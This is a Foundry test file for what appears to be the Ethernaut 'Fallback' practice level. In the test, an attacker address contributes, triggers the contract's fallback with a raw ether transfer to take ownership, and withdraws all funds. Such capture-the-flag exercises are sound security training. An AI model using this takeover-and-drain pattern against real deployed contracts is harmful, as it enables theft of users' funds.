// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback fall;

    address attacker = mkaddr("attacker");

    function setUp() public {
        fall = new Fallback();
    }

    function testHackFallback() public {
        vm.startPrank(attacker);
        //fund attacker wallet
        vm.deal(attacker, 1 ether);
        //make contributions to the contract
        fall.contribute{value: 0.0004 ether}();
        //make a low level call to the contract
        (bool success, ) = address(fall).call{value: 0.0004 ether}("");
        require(success, "transaction failed");

        //withdraw contract funds
        fall.withdraw();
        vm.stopPrank();

    }

    //check contract owner
    function testOwner() public {
        assertEq(fall.owner(), address(this));
    }

    function mkaddr(string memory name) public returns (address) {
        address addr = address(
            uint160(uint256(keccak256(abi.encodePacked(name))))
        );
        vm.label(addr, name);
        return addr;
    }
}
